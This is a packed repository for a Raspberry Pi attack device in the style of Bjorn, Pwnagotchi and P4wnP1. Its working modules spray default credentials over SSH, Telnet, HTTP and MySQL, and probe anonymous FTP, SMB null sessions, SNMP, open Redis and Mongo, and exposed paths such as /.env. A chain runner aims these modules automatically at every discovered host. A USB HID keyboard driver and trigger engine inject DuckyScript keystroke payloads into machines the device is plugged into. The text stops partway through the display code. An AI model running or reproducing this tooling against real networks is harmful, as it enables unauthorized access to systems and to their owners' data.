This file is a merged representation of the entire codebase, combined into a single document by Repomix.

# File Summary

## Purpose
This file contains a packed representation of the entire repository's contents.
It is designed to be easily consumable by AI systems for analysis, code review,
or other automated processes.

## File Format
The content is organized as follows:
1. This summary section
2. Repository information
3. Directory structure
4. Repository files (if enabled)
5. Multiple file entries, each consisting of:
  a. A header with the file path (## File: path/to/file)
  b. The full contents of the file in a code block

## Usage Guidelines
- This file should be treated as read-only. Any changes should be made to the
  original repository files, not this packed version.
- When processing this file, use the file path to distinguish
  between different files in the repository.
- Be aware that this file may contain sensitive information. Handle it with
  the same level of security as you would the original repository.

## Notes
- Some files may have been excluded based on .gitignore rules and Repomix's configuration
- Binary files are not included in this packed representation. Please refer to the Repository Structure section for a complete list of file paths, including binary files
- Files matching patterns in .gitignore are excluded
- Files matching default ignore patterns are excluded
- Files are sorted by Git change count (files with more changes are at the bottom)

# Directory Structure
````
agent/
  offensive/
    modules/
      __init__.py
      base.py
      ftp_anon.py
      http_defaults.py
      http_sensitive.py
      mongo_unauth.py
      mysql_defaults.py
      rdp_probe.py
      redis_unauth.py
      smb_null.py
      snmp_public.py
      ssh_defaults.py
      telnet_defaults.py
      vnc_probe.py
    __init__.py
    chain.py
    ducky.py
    hid_keyboard.py
    payload_triggers.py
  ui/
    __init__.py
    display_manager.py
  workers/
    __init__.py
    exploit_worker.py
    gadget.py
    payload_runner.py
    recon.py
    wifi_handshake.py
  __init__.py
  backend_worker.py
  main.py
  state.py
captures/
  handshakes/
    .gitkeep
config/
  default.yaml
docs/
  architecture.md
  hardware-pinout.md
payloads/
  beacon.ducky
  demo_opener.ducky
  manifest.yaml
  on_handshake.ducky
  on_pwn.ducky
  on_ssh_pwn.ducky
scripts/
  usb_gadget.sh
.gitignore
backend_worker.py
display_manager.py
README.md
requirements.txt
````

# Files

## File: agent/offensive/modules/__init__.py
````python
"""Exploit modules for service-specific attack chains."""

from agent.offensive.modules.ftp_anon import FtpAnonModule
from agent.offensive.modules.http_defaults import HttpDefaultsModule
from agent.offensive.modules.http_sensitive import HttpSensitiveModule
from agent.offensive.modules.mongo_unauth import MongoUnauthModule
from agent.offensive.modules.mysql_defaults import MySqlDefaultsModule
from agent.offensive.modules.rdp_probe import RdpProbeModule
from agent.offensive.modules.redis_unauth import RedisUnauthModule
from agent.offensive.modules.smb_null import SmbNullModule
from agent.offensive.modules.snmp_public import SnmpPublicModule
from agent.offensive.modules.ssh_defaults import SshDefaultsModule
from agent.offensive.modules.telnet_defaults import TelnetDefaultsModule
from agent.offensive.modules.vnc_probe import VncProbeModule

MODULES = [
    SshDefaultsModule(),
    FtpAnonModule(),
    HttpDefaultsModule(),
    HttpSensitiveModule(),
    TelnetDefaultsModule(),
    RedisUnauthModule(),
    MongoUnauthModule(),
    MySqlDefaultsModule(),
    SmbNullModule(),
    SnmpPublicModule(),
    RdpProbeModule(),
    VncProbeModule(),
]

PORT_MAP: dict[int, list] = {}
for mod in MODULES:
    for port in mod.ports:
        PORT_MAP.setdefault(port, []).append(mod)
````

## File: agent/offensive/modules/base.py
````python
"""Base class for Bjorn-style offensive modules."""

from __future__ import annotations

from abc import ABC, abstractmethod
from typing import List, Sequence

from agent.state import HostHit


class ExploitModule(ABC):
    name: str = "base"
    ports: Sequence[int] = ()

    @abstractmethod
    def run(self, host: HostHit) -> bool:
        """Attempt exploit against host; return True on success."""

    def applicable(self, host: HostHit) -> bool:
        return any(p in host.open_ports for p in self.ports)
````

## File: agent/offensive/modules/ftp_anon.py
````python
"""FTP anonymous login check."""

from __future__ import annotations

import ftplib

from agent.offensive.modules.base import ExploitModule
from agent.state import HostHit


class FtpAnonModule(ExploitModule):
    name = "ftp_anon"
    ports = (21,)

    def run(self, host: HostHit) -> bool:
        if 21 not in host.open_ports:
            return False
        try:
            ftp = ftplib.FTP(timeout=4.0)
            ftp.connect(host.ip, 21, timeout=4.0)
            ftp.login("anonymous", "anonymous@")
            ftp.quit()
            return True
        except Exception:
            return False
````

## File: agent/offensive/modules/http_defaults.py
````python
"""HTTP default/basic credential spray."""

from __future__ import annotations

import base64
import urllib.error
import urllib.request
from typing import Sequence, Tuple

from agent.offensive.modules.base import ExploitModule
from agent.state import HostHit

PATHS = ("/", "/admin", "/login")
CREDS: Sequence[Tuple[str, str]] = (
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "root"),
)


class HttpDefaultsModule(ExploitModule):
    name = "http_defaults"
    ports = (80, 8080)

    def run(self, host: HostHit) -> bool:
        ports = [p for p in host.open_ports if p in self.ports]
        if not ports:
            return False
        for port in ports:
            for path in PATHS:
                for user, password in CREDS:
                    if self._try_basic(host.ip, port, path, user, password):
                        return True
        return False

    def _try_basic(self, ip: str, port: int, path: str, user: str, password: str) -> bool:
        url = f"http://{ip}:{port}{path}"
        token = base64.b64encode(f"{user}:{password}".encode()).decode()
        req = urllib.request.Request(url)
        req.add_header("Authorization", f"Basic {token}")
        try:
            with urllib.request.urlopen(req, timeout=4.0) as resp:
                return resp.status < 400
        except urllib.error.HTTPError as exc:
            return exc.code not in (401, 403)
        except Exception:
            return False
````

## File: agent/offensive/modules/http_sensitive.py
````python
"""HTTP sensitive path discovery."""

from __future__ import annotations

import urllib.error
import urllib.request

from agent.offensive.modules.base import ExploitModule
from agent.state import HostHit

SENSITIVE_PATHS = (
    "/.env",
    "/admin",
    "/phpmyadmin/",
    "/server-status",
    "/.git/HEAD",
)


class HttpSensitiveModule(ExploitModule):
    name = "http_sensitive"
    ports = (80, 8080, 443)

    def run(self, host: HostHit) -> bool:
        ports = [p for p in host.open_ports if p in self.ports]
        if not ports:
            return False
        for port in ports:
            scheme = "https" if port == 443 else "http"
            for path in SENSITIVE_PATHS:
                url = f"{scheme}://{host.ip}:{port}{path}"
                try:
                    with urllib.request.urlopen(url, timeout=4.0) as resp:
                        if resp.status < 400:
                            return True
                except urllib.error.HTTPError as exc:
                    if exc.code in (401, 403):
                        return True
                except Exception:
                    continue
        return False
````

## File: agent/offensive/modules/mongo_unauth.py
````python
"""MongoDB open instance probe."""

from __future__ import annotations

import socket

from agent.offensive.modules.base import ExploitModule
from agent.state import HostHit


class MongoUnauthModule(ExploitModule):
    name = "mongo_unauth"
    ports = (27017,)

    def run(self, host: HostHit) -> bool:
        if 27017 not in host.open_ports:
            return False
        try:
            with socket.create_connection((host.ip, 27017), timeout=3.0) as sock:
                greeting = sock.recv(512)
                return len(greeting) > 0
        except OSError:
            return False
````

## File: agent/offensive/modules/mysql_defaults.py
````python
"""MySQL default / empty password check."""

from __future__ import annotations

import socket
import struct

from agent.offensive.modules.base import ExploitModule
from agent.state import HostHit


class MySqlDefaultsModule(ExploitModule):
    name = "mysql_defaults"
    ports = (3306,)

    def run(self, host: HostHit) -> bool:
        if 3306 not in host.open_ports:
            return False
        for user, password in (("root", ""), ("root", "root"), ("mysql", "")):
            if self._try_auth(host.ip, user, password):
                return True
        return False

    def _try_auth(self, ip: str, user: str, password: str) -> bool:
        try:
            with socket.create_connection((ip, 3306), timeout=3.0) as sock:
                greeting = sock.recv(256)
                if not greeting or greeting[0] != 0x0a:
                    return False
                # Minimal handshake response — server may accept empty auth on misconfigs.
                user_b = user.encode() + b"\x00"
                payload = struct.pack("<I", len(user_b) + 33)[:3] + bytes([0x01]) + user_b
                sock.send(payload[:4] + payload[4:])
                resp = sock.recv(64)
                return resp and resp[0] == 0x00
        except OSError:
            return False
````

## File: agent/offensive/modules/rdp_probe.py
````python
"""RDP service reachability (Bjorn-style service pwn marker)."""

from __future__ import annotations

import socket

from agent.offensive.modules.base import ExploitModule
from agent.state import HostHit


class RdpProbeModule(ExploitModule):
    name = "rdp_probe"
    ports = (3389,)

    def run(self, host: HostHit) -> bool:
        if 3389 not in host.open_ports:
            return False
        try:
            with socket.create_connection((host.ip, 3389), timeout=3.0) as sock:
                banner = sock.recv(16)
                return banner.startswith(b"\x03\x00")
        except OSError:
            return False
````

## File: agent/offensive/modules/redis_unauth.py
````python
"""Redis unauthenticated instance check."""

from __future__ import annotations

import socket

from agent.offensive.modules.base import ExploitModule
from agent.state import HostHit


class RedisUnauthModule(ExploitModule):
    name = "redis_unauth"
    ports = (6379,)

    def run(self, host: HostHit) -> bool:
        if 6379 not in host.open_ports:
            return False
        try:
            with socket.create_connection((host.ip, 6379), timeout=3.0) as sock:
                sock.sendall(b"PING\r\n")
                resp = sock.recv(128)
                return b"PONG" in resp.upper()
        except OSError:
            return False
````

## File: agent/offensive/modules/smb_null.py
````python
"""SMB null session / open share probe."""

from __future__ import annotations

import socket
import subprocess

from agent.offensive.modules.base import ExploitModule
from agent.state import HostHit


class SmbNullModule(ExploitModule):
    name = "smb_null"
    ports = (445, 139)

    def run(self, host: HostHit) -> bool:
        if not any(p in host.open_ports for p in self.ports):
            return False
        if self._try_smbclient(host.ip):
            return True
        return self._try_socket(host.ip)

    def _try_smbclient(self, ip: str) -> bool:
        try:
            result = subprocess.run(
                ["smbclient", "-L", ip, "-N", "-g"],
                capture_output=True,
                text=True,
                timeout=8,
                check=False,
            )
            return result.returncode == 0 and "Disk" in result.stdout
        except (OSError, subprocess.SubprocessError):
            return False

    def _try_socket(self, ip: str) -> bool:
        for port in (445, 139):
            try:
                with socket.create_connection((ip, port), timeout=2.0) as sock:
                    sock.send(b"\x00\x00\x00\x85\xffSMB\x72\x00")
                    resp = sock.recv(128)
                    if resp and len(resp) > 4:
                        return True
            except OSError:
                continue
        return False
````

## File: agent/offensive/modules/snmp_public.py
````python
"""SNMP public community string probe."""

from __future__ import annotations

import subprocess

from agent.offensive.modules.base import ExploitModule
from agent.state import HostHit


class SnmpPublicModule(ExploitModule):
    name = "snmp_public"
    ports = (161,)  # UDP — module probes even if TCP sweep missed it

    def run(self, host: HostHit) -> bool:
        try:
            result = subprocess.run(
                ["snmpwalk", "-v2c", "-c", "public", host.ip, "1.3.6.1.2.1.1.1.0"],
                capture_output=True,
                text=True,
                timeout=6,
                check=False,
            )
            return result.returncode == 0 and "Timeout" not in result.stderr
        except (OSError, subprocess.SubprocessError):
            return False
````

## File: agent/offensive/modules/ssh_defaults.py
````python
"""SSH default credential spray."""

from __future__ import annotations

import socket
import subprocess
from typing import Sequence, Tuple

from agent.offensive.modules.base import ExploitModule
from agent.state import HostHit

DEFAULT_CREDS: Sequence[Tuple[str, str]] = (
    ("root", "root"),
    ("admin", "admin"),
    ("pi", "raspberry"),
    ("ubuntu", "ubuntu"),
    ("root", "toor"),
)


class SshDefaultsModule(ExploitModule):
    name = "ssh_defaults"
    ports = (22,)

    def run(self, host: HostHit) -> bool:
        if 22 not in host.open_ports:
            return False
        for user, password in DEFAULT_CREDS:
            if self._try_ssh(host.ip, user, password):
                return True
        return False

    def _try_ssh(self, ip: str, user: str, password: str) -> bool:
        try:
            with socket.create_connection((ip, 22), timeout=2.0):
                pass
        except OSError:
            return False

        try:
            import paramiko

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                ip,
                username=user,
                password=password,
                timeout=4.0,
                allow_agent=False,
                look_for_keys=False,
                auth_timeout=4.0,
            )
            client.close()
            return True
        except ImportError:
            return self._try_ssh_subprocess(ip, user, password)
        except Exception:
            return False

    def _try_ssh_subprocess(self, ip: str, user: str, password: str) -> bool:
        try:
            result = subprocess.run(
                [
                    "sshpass",
                    "-p",
                    password,
                    "ssh",
                    "-o",
                    "StrictHostKeyChecking=no",
                    "-o",
                    "UserKnownHostsFile=/dev/null",
                    "-o",
                    "BatchMode=no",
                    f"{user}@{ip}",
                    "exit",
                ],
                capture_output=True,
                timeout=6,
                check=False,
            )
            return result.returncode == 0
        except (OSError, subprocess.SubprocessError):
            return False
````

## File: agent/offensive/modules/telnet_defaults.py
````python
"""Telnet default credential spray."""

from __future__ import annotations

import socket
import time
from typing import Sequence, Tuple

from agent.offensive.modules.base import ExploitModule
from agent.state import HostHit

CREDS: Sequence[Tuple[str, str]] = (
    ("root", "root"),
    ("admin", "admin"),
    ("user", "user"),
    ("", ""),
)


class TelnetDefaultsModule(ExploitModule):
    name = "telnet_defaults"
    ports = (23,)

    def run(self, host: HostHit) -> bool:
        if 23 not in host.open_ports:
            return False
        for user, password in CREDS:
            if self._try_login(host.ip, user, password):
                return True
        return False

    def _try_login(self, ip: str, user: str, password: str) -> bool:
        try:
            with socket.create_connection((ip, 23), timeout=3.0) as sock:
                sock.settimeout(2.0)
                data = sock.recv(256).decode(errors="ignore")
                if "login" in data.lower() or "username" in data.lower():
                    sock.sendall((user + "\n").encode())
                    time.sleep(0.3)
                    sock.recv(256)
                    sock.sendall((password + "\n").encode())
                    time.sleep(0.4)
                    resp = sock.recv(512).decode(errors="ignore").lower()
                    if any(x in resp for x in ("$", "#", "last login", "welcome")):
                        return True
                    if "incorrect" in resp or "failed" in resp or "denied" in resp:
                        return False
        except OSError:
            return False
        return False
````

## File: agent/offensive/modules/vnc_probe.py
````python
"""VNC RFB handshake probe."""

from __future__ import annotations

import socket

from agent.offensive.modules.base import ExploitModule
from agent.state import HostHit


class VncProbeModule(ExploitModule):
    name = "vnc_probe"
    ports = (5900, 5901)

    def run(self, host: HostHit) -> bool:
        ports = [p for p in host.open_ports if p in self.ports]
        if not ports:
            return False
        for port in ports:
            try:
                with socket.create_connection((host.ip, port), timeout=3.0) as sock:
                    banner = sock.recv(12)
                    if banner.startswith(b"RFB"):
                        return True
            except OSError:
                continue
        return False
````

## File: agent/offensive/__init__.py
````python
"""Offensive modules and exploit chains (Bjorn-inspired)."""
````

## File: agent/offensive/chain.py
````python
"""Bjorn-style exploit chain runner."""

from __future__ import annotations

import logging
from typing import List

from agent.offensive.modules import MODULES, PORT_MAP
from agent.state import AgentState, HostHit, Mode

logger = logging.getLogger(__name__)


class ExploitChain:
    """Run port-matched modules against recon results."""

    def __init__(self, state: AgentState, modules: List | None = None) -> None:
        self.state = state
        self.modules = modules or MODULES

    def run_chain(self, hosts: List[HostHit]) -> int:
        wins = 0
        self.state.set_mode(Mode.ATTACKING)
        for host in hosts:
            modules_to_run: list = []
            for port in host.open_ports:
                modules_to_run.extend(PORT_MAP.get(port, []))
            for mod in self.modules:
                if mod.name == "snmp_public":
                    modules_to_run.append(mod)
            seen = set()
            for mod in modules_to_run:
                if mod.name in seen:
                    continue
                seen.add(mod.name)
                try:
                    ok = mod.run(host)
                    self.state.record_exploit(mod.name, host.ip, ok)
                    if ok:
                        wins += 1
                except Exception as exc:  # noqa: BLE001
                    logger.debug("module %s failed: %s", mod.name, exc)
                    self.state.record_exploit(mod.name, host.ip, False)
        return wins
````

## File: agent/offensive/ducky.py
````python
"""P4wnP1-style DuckyScript interpreter for HID payloads."""

from __future__ import annotations

import re
import time
from pathlib import Path
from typing import Callable, List, Optional

from agent.offensive.hid_keyboard import HidKeyboard

DelayFn = Callable[[int], None]


class DuckyRunner:
    """Execute DuckyScript payloads via USB HID keyboard gadget."""

    def __init__(
        self,
        keyboard: Optional[HidKeyboard] = None,
        delay_fn: Optional[DelayFn] = None,
    ) -> None:
        self.keyboard = keyboard or HidKeyboard()
        self._delay = delay_fn or (lambda ms: time.sleep(ms / 1000.0))

    def run_file(self, path: Path) -> None:
        lines = path.read_text().splitlines()
        self.run_lines(lines)

    def run_lines(self, lines: List[str]) -> None:
        for raw in lines:
            line = raw.strip()
            if not line or line.startswith("#"):
                continue
            self._exec(line)

    def _exec(self, line: str) -> None:
        upper = line.upper()
        if upper.startswith("DELAY "):
            ms = int(upper.split()[1])
            self._delay(ms)
        elif upper.startswith("STRING "):
            text = line[7:]
            self.keyboard.type_string(text)
        elif upper == "ENTER":
            self.keyboard.press_key("ENTER")
        elif upper.startswith("REPEAT "):
            count = int(upper.split()[1])
            for _ in range(count):
                self.keyboard.press_key("ENTER")
        elif upper.startswith("ALT "):
            key = upper.split()[1]
            self.keyboard.press_combo(["ALT", key])
        elif upper.startswith("GUI "):
            key = upper.split()[1]
            self.keyboard.press_combo(["GUI", key])
        elif re.match(r"^[A-Z0-9]$", upper):
            self.keyboard.press_key(upper)
````

## File: agent/offensive/hid_keyboard.py
````python
"""Linux USB HID gadget keyboard driver (/dev/hidg0)."""

from __future__ import annotations

import logging
import time
from pathlib import Path
from typing import Dict, List, Optional, Sequence

logger = logging.getLogger(__name__)

HID_DEVICE = Path("/dev/hidg0")

# Modifier bit masks
MOD = {"CTRL": 0x01, "SHIFT": 0x02, "ALT": 0x04, "GUI": 0x08}

# HID usage IDs (USB HID spec) for common keys
KEYS: Dict[str, int] = {
    "A": 0x04, "B": 0x05, "C": 0x06, "D": 0x07, "E": 0x08, "F": 0x09,
    "G": 0x0a, "H": 0x0b, "I": 0x0c, "J": 0x0d, "K": 0x0e, "L": 0x0f,
    "M": 0x10, "N": 0x11, "O": 0x12, "P": 0x13, "Q": 0x14, "R": 0x15,
    "S": 0x16, "T": 0x17, "U": 0x18, "V": 0x19, "W": 0x1a, "X": 0x1b,
    "Y": 0x1c, "Z": 0x1d,
    "1": 0x1e, "2": 0x1f, "3": 0x20, "4": 0x21, "5": 0x22, "6": 0x23,
    "7": 0x24, "8": 0x25, "9": 0x26, "0": 0x27,
    "ENTER": 0x28, "ESC": 0x29, "SPACE": 0x2c, "TAB": 0x2b,
    "-": 0x2d, "=": 0x2e, "[": 0x2f, "]": 0x30, "\\": 0x31,
    ";": 0x33, "'": 0x34, "`": 0x35, ",": 0x36, ".": 0x37, "/": 0x38,
}

SHIFT_CHARS = {
    "!": "1", "@": "2", "#": "3", "$": "4", "%": "5", "^": "6",
    "&": "7", "*": "8", "(": "9", ")": "0",
}


class HidKeyboard:
    """Write 8-byte HID keyboard reports to the gadget device."""

    def __init__(self, device: Path = HID_DEVICE, mock: bool = False) -> None:
        self.device = device
        self.mock = mock or not device.exists()

    def available(self) -> bool:
        return not self.mock

    def _write_report(self, modifiers: int, keys: Sequence[int]) -> None:
        report = bytes([modifiers, 0x00] + list(keys[:6]) + [0x00] * (6 - min(len(keys), 6)))
        if self.mock:
            logger.debug("HID mock report: %s", report.hex())
            return
        with open(self.device, "wb", buffering=0) as hid:
            hid.write(report)
            # Release keys
            hid.write(bytes(8))

    def press_key(self, key: str, modifiers: int = 0) -> None:
        usage = KEYS.get(key.upper())
        if usage is None:
            logger.debug("unknown key: %s", key)
            return
        self._write_report(modifiers, [usage])
        time.sleep(0.02)

    def press_combo(self, keys: List[str]) -> None:
        mods = 0
        usages: List[int] = []
        for k in keys:
            ku = k.upper()
            if ku in MOD:
                mods |= MOD[ku]
            elif ku in KEYS:
                usages.append(KEYS[ku])
        self._write_report(mods, usages)
        time.sleep(0.02)

    def type_string(self, text: str) -> None:
        for ch in text:
            if ch == "\n":
                self.press_key("ENTER")
                continue
            if ch in SHIFT_CHARS:
                base = SHIFT_CHARS[ch]
                self.press_key(base, MOD["SHIFT"])
                continue
            if ch == " ":
                self.press_key("SPACE")
                continue
            if ch.isupper():
                self.press_key(ch, MOD["SHIFT"])
            elif ch in KEYS:
                self.press_key(ch)
            else:
                logger.debug("skip char: %r", ch)
            time.sleep(0.01)
````

## File: agent/offensive/payload_triggers.py
````python
"""P4wnP1-style payload trigger rules and event dispatch."""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional

import yaml

logger = logging.getLogger(__name__)

ROOT = Path(__file__).resolve().parents[2]
PAYLOAD_DIR = ROOT / "payloads"
MANIFEST_PATH = PAYLOAD_DIR / "manifest.yaml"
MANUAL_TRIGGER_FILE = PAYLOAD_DIR / "trigger.request"

RunFn = Callable[[Path], bool]


@dataclass
class TriggerRule:
    event: str
    payload: Path
    cooldown_s: float = 60.0
    module_filter: str = ""
    last_fired: float = 0.0
    interval_s: float = 0.0
    enabled: bool = True


class PayloadTriggerEngine:
    """
    Maps offensive events to HID payloads (P4wnP1 trigger profiles).

    Events: boot, handshake, exploit_success, gadget_host, scan_complete,
    interval, manual.
    """

    def __init__(
        self,
        rules: Optional[List[TriggerRule]] = None,
        run_fn: Optional[RunFn] = None,
    ) -> None:
        self.rules = rules or []
        self._run_fn = run_fn
        self._stop = False
        self._host_was_connected = False
        self._boot_done = False

    def set_runner(self, run_fn: RunFn) -> None:
        self._run_fn = run_fn

    def load_from_config(self, cfg: Dict[str, Any]) -> None:
        merged: List[TriggerRule] = list(self.rules)
        if MANIFEST_PATH.exists():
            with open(MANIFEST_PATH) as f:
                manifest = yaml.safe_load(f) or {}
            for item in manifest.get("triggers", []):
                merged.append(self._rule_from_dict(item))

        for item in cfg.get("payload_triggers", []):
            merged.append(self._rule_from_dict(item))

        self.rules = merged
        logger.info("loaded %d payload trigger rules", len(self.rules))

    def _rule_from_dict(self, item: Dict[str, Any]) -> TriggerRule:
        payload = item.get("payload") or item.get("file") or ""
        path = Path(payload)
        if not path.is_absolute():
            path = ROOT / payload
        return TriggerRule(
            event=str(item.get("event", "")),
            payload=path,
            cooldown_s=float(item.get("cooldown_s", item.get("cooldown", 60))),
            module_filter=str(item.get("module", item.get("module_filter", ""))),
            interval_s=float(item.get("interval_s", 0)),
            enabled=bool(item.get("enabled", True)),
        )

    def stop(self) -> None:
        self._stop = True

    def handle_event(self, event: str, context: Dict[str, Any]) -> int:
        fired = 0
        for rule in self.rules:
            if not rule.enabled or rule.event != event:
                continue
            if rule.module_filter and context.get("module") != rule.module_filter:
                continue
            if self._fire_rule(rule, context):
                fired += 1
        return fired

    def on_boot(self) -> None:
        if self._boot_done:
            return
        self._boot_done = True
        self.handle_event("boot", {})

    def run_listener_loop(
        self,
        poll_s: float = 2.0,
        gadget_poll_s: float = 1.0,
    ) -> None:
        """Poll gadget host + manual trigger file + interval rules."""
        last_gadget_poll = 0.0
        last_interval_check = 0.0
        self.on_boot()

        while not self._stop:
            now = time.monotonic()

            if now - last_gadget_poll >= gadget_poll_s:
                last_gadget_poll = now
                self._poll_gadget_host()

            if MANUAL_TRIGGER_FILE.exists():
                self._poll_manual_trigger()

            if now - last_interval_check >= 5.0:
                last_interval_check = now
                self._poll_interval_rules()

            time.sleep(poll_s)

    def _poll_gadget_host(self) -> None:
        connected = self._gadget_host_connected()
        if connected and not self._host_was_connected:
            self._host_was_connected = True
            self.handle_event("gadget_host", {})
        elif not connected:
            self._host_was_connected = False

    def _gadget_host_connected(self) -> bool:
        udc = Path("/sys/class/udc")
        if not udc.exists():
            return False
        for entry in udc.iterdir():
            state_file = entry / "state"
            if state_file.exists():
                try:
                    state = state_file.read_text().strip().lower()
                    if state in ("configured", "active"):
                        return True
                except OSError:
                    continue
        return False

    def _poll_manual_trigger(self) -> None:
        try:
            raw = MANUAL_TRIGGER_FILE.read_text().strip()
            MANUAL_TRIGGER_FILE.unlink(missing_ok=True)
        except OSError:
            return
        if not raw:
            return
        path = Path(raw)
        if not path.is_absolute():
            path = PAYLOAD_DIR / raw
        if path.exists() and self._run_fn:
            logger.info("manual trigger -> %s", path.name)
            self._run_fn(path)

    def _poll_interval_rules(self) -> None:
        now = time.monotonic()
        for rule in self.rules:
            if rule.event != "interval" or not rule.enabled or rule.interval_s <= 0:
                continue
            if now - rule.last_fired >= rule.interval_s:
                self._fire_rule(rule, {})

    def _fire_rule(self, rule: TriggerRule, context: Dict[str, Any]) -> bool:
        now = time.monotonic()
        if now - rule.last_fired < rule.cooldown_s:
            return False
        path = rule.payload
        if context.get("path"):
            path = Path(context["path"])
        if not path.exists():
            logger.debug("trigger payload missing: %s", path)
            return False
        if self._run_fn is None:
            return False
        rule.last_fired = now
        logger.info("trigger %s -> %s", rule.event, path.name)
        try:
            return bool(self._run_fn(path))
        except Exception as exc:  # noqa: BLE001
            logger.warning("trigger run failed: %s", exc)
            return False
````

## File: agent/ui/__init__.py
````python
"""UI package."""

from agent.ui.display_manager import DisplayManager

__all__ = ["DisplayManager"]
````

## File: agent/ui/display_manager.py
````python
"""Waveshare 2.13\" tri-color e-ink UI (Pwnagotchi-style offensive telemetry)."""

from __future__ import annotations

import logging
import threading
from pathlib import Path
from typing import Optional, Tuple

from PIL import Image, ImageDraw, ImageFont

from agent.state import AgentState, Mode

logger = logging.getLogger(__name__)

EPD_WIDTH = 250
EPD_HEIGHT = 122


def _load_font(size: int) -> ImageFont.ImageFont:
    candidates = [
        "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf",
        "/usr/share/fonts/truetype/freefont/FreeSans.ttf",
    ]
    for path in candidates:
        if Path(path).exists():
            try:
                return ImageFont.truetype(path, size)
            except OSError:
                continue
    return ImageFont.load_default()


class DisplayManager:
    """Independent refresh loop for offensive telemetry on e-ink."""

    def __init__(
        self,
        state: AgentState,
        refresh_s: float = 12.0,
        mock_dir: Optional[Path] = None,
        use_hardware: bool = True,
    ) -> None:
        self.state = state
        self.refresh_s = refresh_s
        self.mock_dir = mock_dir or Path(__file__).resolve().parents[2] / "logs"
        self.use_hardware = use_hardware
        self._stop = threading.Event()
        self._epd = None
        self._font_md = _load_font(11)
        self._font_sm = _load_font(9)

    def start(self) -> threading.Thread:
        t = threading.Thread(target=self.run_loop, name="display", daemon=True)
        t.start()
        return t

    def stop(self) -> None:
        self._stop.set()

    def run_loop(self) -> None:
        try:
            self._init_epd()
        except Exception as exc:  # noqa: BLE001
            logger.warning("display init failed, using mock frames: %s", exc)
            self.state.push_log("display mock")
            self._epd = None

        while not self._stop.is_set():
            try:
                self.render_once()
            except Exception as exc:  # noqa: BLE001
                logger.warning("display refresh error: %s", exc)
                self.state.push_log("display err")
            self._stop.wait(timeout=self.refresh_s)

        self._sleep_epd()

    def render_once(self) -> None:
        snap = self.state.snapshot()
        black, red = self._compose(snap)

        if self._epd is not None:
            self._push_hardware(black, red)
        else:
            self.mock_dir.mkdir(parents=True, exist_ok=True)
            out = self.mock_dir / "eink_preview.png"
            preview = black.convert("RGB")
            red_overlay = Image.new("RGB", (EPD_WIDTH, EPD_HEIGHT), (180, 0, 0))
            mask = red.point(lambda p: 255 if p < 128 else 0).convert("L")
            preview.paste(red_overlay, (0, 0), mask)
            preview.save(out)

    def _compose(self, snap: dict) -> Tuple[Image.Image, Image.Image]:
        black = Image.new("1", (EPD_WIDTH, EPD_HEIGHT), 255)
        red = Image.new("1", (EPD_WIDTH, EPD_HEIGHT), 255)
        db = ImageDraw.Draw(black)
        dr = ImageDraw.Draw(red)

        mode: Mode = snap["mode"]
        uptime = snap["uptime_s"]
        hh, rem = divmod(uptime, 3600)
        mm, ss = divmod(rem, 60)

        db.rectangle((0, 0, EPD_WIDTH - 1, EPD_HEIGHT - 1), outline=0, width=1)
        db.rectangle((0, 0, EPD_WIDTH - 1, 18), outline=0, width=1)

        db.text((4, 3), "RPi-Agent", font=self._font_md, fill=0)
        mode_label = mode.value.upper()
        hs = snap.get("handshakes_captured", 0)
        header_right = f"{mode_label}  HS:{hs}"
        accent_modes = (
            Mode.SCANNING,
            Mode.ACTIVE,
            Mode.HANDSHAKE,
            Mode.ATTACKING,
            Mode.PAYLOAD,
            Mode.ERROR,
        )
        accent = dr if mode in accent_modes else db
        accent.text(
            (max(4, EPD_WIDTH - 4 - len(header_right) * 6), 3),
            header_right,
            font=self._font_md,
            fill=0,
        )

        db.line((0, 18, EPD_WIDTH, 18), fill=0)
        peers = snap.get("session_peers", 0)
        deauths = snap.get("session_deauths", 0)
        pwned = snap.get("session_pwned", 0)
        pl_ok = snap.get("session_payloads_ok", 0)
        pl_run = snap.get("session_payloads_run", 0)
        ch = snap.get("session_channel", "") or "-"
        db.text((4, 22), f"PEERS:{peers}", font=self._font_sm, fill=0)
        db.text((70, 22), f"DEAUTH:{deauths}", font=self._font_sm, fill=0)
        dr.text((145, 22), f"PWN:{pwned}", font=self._font_sm, fill=0)

        db.line((0, 36, EPD_WIDTH, 36), fill=0)
        aps = snap.get("wifi_aps_seen", 0)
        exp_run = snap.get("exploits_run", 0)
        exp_ok = snap.get("exploits_success", 0)
        db.text((4, 40), f"APs:{aps} HOSTS:{snap['hosts_found']}", font=self._font_sm, fill=0)
        db.text((130, 40), f"EXP:{exp_ok}/{exp_run}", font=self._font_sm, fill=0)
        db.text((200, 40), f"CH:{ch}", font=self._font_sm, fill=0)

        db.line((0, 52, EPD_WIDTH, 52), fill=0)
        db.text(
            (4, 56),
            f"CPU {snap['cpu_percent']:.0f}% RAM {snap['ram_percent']:.0f}%",
            font=self._font_sm,
            fill=0,
        )
        db.text((140, 56), f"UP {hh:02d}:{mm:02d}:{ss:02d}", font=self._font_sm, fill=0)

        db.line((0, 70, EPD_WIDTH, 70), fill=0)
        if snap.get("payload_active"):
            dr.text(
                (4, 74),
                f"RUN {snap.get('payload_name', '')[:22]}",
                font=self._font_sm,
                fill=0,
            )
        else:
            gadget = "ON" if snap["gadget_active"] else "OFF"
            hid = "HID" if snap.get("hid_ready") else "---"
            db.text((4, 74), f"GAD:{gadget}+{hid} PLD:{pl_ok}/{pl_run}", font=self._font_sm, fill=0)
            target = snap.get("wifi_target_essid") or snap.get("wifi_target_bssid") or "-"
            target_short = target[:12] if len(target) <= 12 else target[:9] + "..."
            accent_target = dr if mode == Mode.HANDSHAKE else db
            accent_target.text((130, 74), target_short, font=self._font_sm, fill=0)

        db.line((0, 86, EPD_WIDTH, 86), fill=0)
        y = 90
        for line in snap["log_lines"][:2]:
            text = line if len(line) <= 38 else line[:35] + "..."
            db.text((4, y), text, font=self._font_sm, fill=0)
            y += 10

        return black, red

    def _init_epd(self) -> None:
        if not self.use_hardware:
            self._epd = None
            return
        try:
            try:
                from waveshare_epd import epd2in13b_V4 as epd_mod
            except ImportError:
                from waveshare_epd import epd2in13_V4 as epd_mod

            epd = epd_mod.EPD()
            epd.init()
            try:
                epd.Clear()
            except Exception:  # noqa: BLE001
                pass
